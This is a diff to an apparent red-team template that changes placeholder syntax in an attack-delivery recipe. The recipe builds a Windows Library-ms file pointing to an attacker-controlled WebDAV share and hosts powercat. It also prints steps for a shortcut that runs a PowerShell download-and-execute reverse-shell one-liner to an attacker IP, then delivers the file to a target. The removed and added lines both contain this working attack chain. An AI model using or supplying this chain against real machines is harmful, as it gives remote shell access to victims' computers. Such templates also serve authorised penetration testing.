@@ -21,7 +21,7 @@ content: |
   <isDefaultSaveLocation>true</isDefaultSaveLocation>
   <isSupported>false</isSupported>
   <simpleLocation>
-  <url>http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/webdav_port)%></url>
+  <url>http://{{ attacker_ip }}:{{ webdav_port }}</url>
   </simpleLocation>
   </searchConnectorDescription>
   </searchConnectorDescriptionList>
@@ -29,10 +29,10 @@ content: |
   ' > packstation/outbound/webdav/config.Library-ms; \
   cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound/;
 
-  echo "1. Start a revshell listener: <%echo $(esh scripts/listener-nc)%>"; \
-  echo "2. Start a webserver for powercat:  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound"; \
+  echo "1. Start a revshell listener: {{ include('scripts/listener-nc.yaml') }}"; \
+  echo "2. Start a webserver for powercat:  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound"; \
   echo "3. Using windows, create a shortcut file with the following target: "; \
-  echo 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powercat.ps1\');powercat -c <%=$(esh variables/attacker_ip)%> -p <%=$(esh variables/shell_port)%> -e powershell" '; \
+  echo 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1\');powercat -c {{ attacker_ip }} -p {{ shell_port }} -e powershell" '; \
   echo "4. Place this shortcut file into packstation/outbound/webdav"; \
-  echo "4. Start a webdav server: wsgidav --host=0.0.0.0 --port=<%=$(esh variables/webdav_port)%> --auth=anonymous --root packstation/outbound/webdav/"; \
+  echo "4. Start a webdav server: wsgidav --host=0.0.0.0 --port={{ webdav_port }} --auth=anonymous --root packstation/outbound/webdav/"; \
   echo "6. Deliver the webdav-link-file config.Library-ms (created in packstation/outbound/webdav) to your target"
